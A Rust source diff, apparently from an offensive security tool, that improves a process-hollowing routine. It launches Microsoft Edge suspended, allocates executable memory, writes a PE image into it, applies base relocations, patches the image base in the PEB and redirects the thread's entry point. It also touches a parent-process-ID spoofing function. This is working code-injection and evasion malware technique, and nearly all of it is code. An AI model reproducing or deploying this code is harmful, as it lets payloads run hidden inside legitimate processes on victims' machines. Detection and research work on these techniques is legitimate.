@@ -6,15 +6,21 @@ use windows::{
         Foundation::{self, CloseHandle, HANDLE, HMODULE},
         System::{
             Diagnostics::Debug::{
-                GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory, CONTEXT, CONTEXT_FULL_AMD64, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER
-            }, LibraryLoader::GetModuleFileNameA, Memory::{VirtualAllocEx, PAGE_EXECUTE_READWRITE, VIRTUAL_ALLOCATION_TYPE}, SystemServices::IMAGE_DOS_HEADER, Threading::{
+                GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory, CONTEXT,
+                CONTEXT_FULL_AMD64, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
+            },
+            LibraryLoader::GetModuleFileNameA,
+            Memory::{VirtualAllocEx, PAGE_EXECUTE_READWRITE, VIRTUAL_ALLOCATION_TYPE},
+            SystemServices::{IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER},
+            Threading::{
                 CreateProcessA, DeleteProcThreadAttributeList, InitializeProcThreadAttributeList,
-                OpenProcess, ResumeThread, UpdateProcThreadAttribute, EXTENDED_STARTUPINFO_PRESENT,
-                LPPROC_THREAD_ATTRIBUTE_LIST, PEB, PROCESS_BASIC_INFORMATION,
-                PROCESS_CREATE_PROCESS, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION,
-                PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
-                RTL_USER_PROCESS_PARAMETERS, STARTUPINFOA, STARTUPINFOEXA,
-            }
+                OpenProcess, ResumeThread, UpdateProcThreadAttribute, CREATE_SUSPENDED,
+                EXTENDED_STARTUPINFO_PRESENT, LPPROC_THREAD_ATTRIBUTE_LIST, PEB,
+                PROCESS_BASIC_INFORMATION, PROCESS_CREATE_PROCESS, PROCESS_CREATION_FLAGS,
+                PROCESS_INFORMATION, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, RTL_USER_PROCESS_PARAMETERS, STARTUPINFOA,
+                STARTUPINFOEXA,
+            },
         },
     },
 };
@@ -23,19 +29,38 @@ pub fn get_current_filename() -> String {
     let mut buffer: [u8; 260] = [0; 260]; // MAX_PATH is typically 260
     let length = unsafe { GetModuleFileNameA(HMODULE::default(), &mut buffer) };
 
-    String::from_utf8(buffer[..length as usize].to_vec()).expect("Failed to convert buffer to String")
+    String::from_utf8(buffer[..length as usize].to_vec())
+        .expect("Failed to convert buffer to String")
+}
+
+// https://docs.microsoft.com/fr-fr/windows/win32/debug/pe-format#the-reloc-section-image-only
+#[derive(Debug, Copy, Clone)]
+struct ImageRelocationEntry {
+    data: u16,
+}
+
+impl ImageRelocationEntry {
+    // Getter for the offset field
+    fn offset(&self) -> u16 {
+        self.data & 0x0FFF
+    }
+
+    // Getter for the type field
+    fn typ(&self) -> u8 {
+        (self.data >> 12) as u8
+    }
 }
 
 // This currently works only for x64. For x86 registers and offsets need to be adjusted.
 pub fn process_hollowing(filename: String) {
     let contents = fs::read(filename.clone()).expect("Could not read file");
-    
 
     let dos_header = contents.as_ptr() as *const IMAGE_DOS_HEADER;
     let nt_headers = unsafe {
-        (contents.as_ptr().add((*dos_header).e_lfanew as usize)) as *const IMAGE_NT_HEADERS64
+        (contents.as_ptr().add((*dos_header).e_lfanew as usize)) as *mut IMAGE_NT_HEADERS64
     };
-    let section_header = ((nt_headers as usize) + size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
+    let section_header =
+        ((nt_headers as usize) + size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
 
     let mut startup_info = STARTUPINFOA::default();
     startup_info.cb = size_of::<STARTUPINFOA>() as u32;
@@ -43,7 +68,7 @@ pub fn process_hollowing(filename: String) {
 
     let _ = unsafe {
         CreateProcessA(
-            s!("C:\\Windows\\system32\\cmd.exe\0"),
+            s!("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\0"),
             PSTR::null(),
             None,
             None,
@@ -60,23 +85,31 @@ pub fn process_hollowing(filename: String) {
     // this pattern is used instead of VirtualAlloc
     let mut ctx_box: Box<[u8]> = vec![0; size_of::<CONTEXT>()].into_boxed_slice();
     let ctx = ctx_box.as_mut_ptr() as *mut _ as *mut CONTEXT;
-    unsafe { (*ctx ).ContextFlags = CONTEXT_FULL_AMD64;}
+    unsafe {
+        (*ctx).ContextFlags = CONTEXT_FULL_AMD64;
+    }
 
     unsafe {
         GetThreadContext(process_info.hThread, ctx).expect("Could not get thread context");
     }
 
-
     let image_base = unsafe {
         VirtualAllocEx(
             process_info.hProcess,
-            Some((*nt_headers).OptionalHeader.ImageBase as *const c_void),
+            //Some((*nt_headers).OptionalHeader.ImageBase as *const c_void),
+            None,
             (*nt_headers).OptionalHeader.SizeOfImage as usize,
             VIRTUAL_ALLOCATION_TYPE(0x3000),
             PAGE_EXECUTE_READWRITE,
         )
     };
 
+    let delta_image = unsafe { image_base.sub((*nt_headers).OptionalHeader.ImageBase as usize) } as i64;
+    if delta_image != 0 {
+        unsafe {(*nt_headers).OptionalHeader.ImageBase = image_base as u64};
+    }
+    
+    // Writing headers
     unsafe {
         WriteProcessMemory(
             process_info.hProcess,
@@ -84,33 +117,99 @@ pub fn process_hollowing(filename: String) {
             contents.as_ptr() as *const c_void,
             (*nt_headers).OptionalHeader.SizeOfHeaders as usize,
             None,
-        ).expect("Could not write to process memory");
+        )
+        .expect("Could not write to process memory");
 
+        let mut image_relocation_section = IMAGE_SECTION_HEADER::default();
         for i in 0..(*nt_headers).FileHeader.NumberOfSections {
             let curr_section_header = *(section_header.add(i as usize));
+            let s = match std::str::from_utf8(&curr_section_header.Name) {
+                Ok(v) => v,
+                Err(e) => panic!("Invalid UTF-8 sequence: {}", e),
+            };
             WriteProcessMemory(
                 process_info.hProcess,
                 image_base.add(curr_section_header.VirtualAddress as usize),
-                contents.as_ptr().add(curr_section_header.PointerToRawData as usize) as *const c_void,
+                contents
+                    .as_ptr()
+                    .add(curr_section_header.PointerToRawData as usize)
+                    as *const c_void,
                 curr_section_header.SizeOfRawData as usize,
                 None,
-            ).expect("Could not write to process memory");
-        }
-        
-        WriteProcessMemory(
-            process_info.hProcess,
-            ((*ctx).Rdx + 0x10 as u64) as *const c_void,
-            &image_base as *const _ as *const c_void,
-            size_of::<*const c_void>() as usize,
-            None,
-        ).expect("Could not write to image base");
+            )
+            .expect("Could not write to process memory");
 
-        (*ctx).Rcx = image_base.add((*nt_headers).OptionalHeader.AddressOfEntryPoint as usize) as u64;
+            if s.contains(".reloc") {
+                image_relocation_section = curr_section_header;
+            }
+        }
+
+        // Check if a relocation header is present and if the image base is not the preferred image base
+        // TODO do the relocation before writing the headers, then we do not need a WriteProcess call
+        let reloc_header = (*nt_headers).OptionalHeader.DataDirectory[5];
+        if reloc_header.VirtualAddress != 0 && delta_image != 0 {
+            let mut reloc_offset: usize = 0;
+            while reloc_offset < reloc_header.Size as usize {
+                let image_base_relocation = contents
+                    .as_ptr()
+                    .add(image_relocation_section.PointerToRawData as usize)
+                    .add(reloc_offset)
+                    as *const IMAGE_BASE_RELOCATION;
+                reloc_offset += size_of::<IMAGE_BASE_RELOCATION>();
+                let number_of_entries = ((*image_base_relocation).SizeOfBlock as usize
+                    - size_of::<IMAGE_BASE_RELOCATION>())
+                    / size_of::<ImageRelocationEntry>();
+                for _ in 0..number_of_entries {
+                    let image_relocation_entry = contents
+                        .as_ptr()
+                        .add(image_relocation_section.PointerToRawData as usize)
+                        .add(reloc_offset)
+                        as *const ImageRelocationEntry;
+                    reloc_offset += size_of::<ImageRelocationEntry>();
+                    if (*image_relocation_entry).typ() == 0 {
+                        continue;
+                    }
+                    let address_location = image_base
+                        .add((*image_base_relocation).VirtualAddress as usize)
+                        .add((*image_relocation_entry).offset() as usize);
+                    let mut patched_address = 0;
+                    ReadProcessMemory(
+                        process_info.hProcess,
+                        address_location,
+                        &mut patched_address as *mut _ as *mut c_void,
+                        size_of::<u64>(),
+                        None,
+                    ).expect("Could not read ImageRelocationEntry");
+                    patched_address += delta_image;
+                    WriteProcessMemory(
+                        process_info.hProcess,
+                        address_location,
+                        &mut patched_address as *mut _ as *mut c_void,
+                        size_of::<u64>(),
+                        None,
+                    ).expect("Could not write ImageRelocationEntry");
+                }
+            }
+        }
+
+        // Change image base
+        if delta_image != 0 {
+            WriteProcessMemory(
+                process_info.hProcess,
+                ((*ctx).Rdx + 0x10 as u64) as *const c_void,
+                &image_base as *const _ as *const c_void,
+                size_of::<*const c_void>() as usize,
+                None,
+            )
+            .expect("Could not write to image base");
+        }
+
+        // Change entrypoint of thread
+        (*ctx).Rcx =
+            image_base.add((*nt_headers).OptionalHeader.AddressOfEntryPoint as usize) as u64;
         SetThreadContext(process_info.hThread, ctx).expect("Could not set thread context");
         ResumeThread(process_info.hThread);
-    
     }
-
 }
 
 pub fn apply_process_mitigation_policy() {
@@ -228,7 +327,7 @@ pub fn spoof_ppid(ppid: u32) {
             None,
             None,
             false,
-            EXTENDED_STARTUPINFO_PRESENT,
+            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
             None,
             None,
             &startup_info.StartupInfo,
